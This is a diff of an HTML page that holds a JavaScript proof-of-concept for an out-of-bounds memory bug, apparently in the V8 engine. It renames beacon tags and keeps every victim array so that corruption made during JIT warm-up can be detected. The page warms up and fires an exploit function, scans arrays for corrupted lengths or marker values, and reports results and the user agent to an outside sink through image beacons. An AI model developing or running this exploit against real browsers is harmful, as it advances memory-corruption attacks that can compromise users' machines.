@@ -10,14 +10,14 @@ const MARKER = 1.2345678901234e-300;
 function beacon(t, v){
   try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
 }
-beacon('V8-start', navigator.userAgent.slice(0,80));
+beacon('P1-start', navigator.userAgent.slice(0,80));
 try {
   // bounded victim pool (ring of 48) - pre-filled with doubles => INLINE FixedDoubleArray
-  const RING = 48;
+  const RING = 4000;   // keep ALL victims: OOB writes happen during the warm-up, an evicted ring loses the evidence
   var ring = [];
   for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
   var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
-  beacon('V8-pool-done', RING);
+  beacon('P1-pool-done', RING);
 
   var fake = new Uint32Array(10);
   for (var i=0;i<9;i++) fake[i] = i+1;
@@ -27,7 +27,7 @@ try {
     var oob_array = new Array(5); oob_array[0] = 0x500;
     // victim allocated immediately after oob_array (bump pointer in young gen) - slot reused, no growth
     var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;
-    ring[slot] = victim; slot = (slot + 1) % RING;
+    if (ring.length < 20000) ring.push(victim);   // never evict
     let just_a_variable = fake[0];
     let another_variable3 = fake[7];
     if (a % 7 == 0) another_variable3 = 0xff00000000;
@@ -56,15 +56,15 @@ try {
       if (v.length !== 64) { if (hits++ < 6) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
       for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { if (hits++ < 6) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); break; } }
     }
-    beacon('V8-iter','at='+tag+' hits='+hits);
+    beacon('P1-iter','at='+tag+' hits='+hits);
   }
   for (let i = 2; i < 0x500; i++) poc(i);
-  beacon('V8-warm-done','ok'); sweep('warm');
+  beacon('P1-warm-done','ok'); sweep('warm');
   for (let i = 0; i < 3000; i++) poc(i % 500 + 2);
-  beacon('V8-warm3k-done','ok'); sweep('warm3k');
+  beacon('P1-warm3k-done','ok'); sweep('warm3k');
   let triggers = [35, 70, 105];
-  for (let t = 0; t < triggers.length; t++) { beacon('V8-fire','a='+triggers[t]); poc(triggers[t]); sweep('a'+triggers[t]); }
-  beacon('V8-SURVIVED','hits='+hits);
-} catch (e) { beacon('V8-exc', String(e).slice(0,120)); }
-beacon('V8-done','end-of-page');
+  for (let t = 0; t < triggers.length; t++) { beacon('P1-fire','a='+triggers[t]); poc(triggers[t]); sweep('a'+triggers[t]); }
+  beacon('P1-SURVIVED','hits='+hits);
+} catch (e) { beacon('P1-exc', String(e).slice(0,120)); }
+beacon('P1-done','end-of-page');
 </script></body></html>
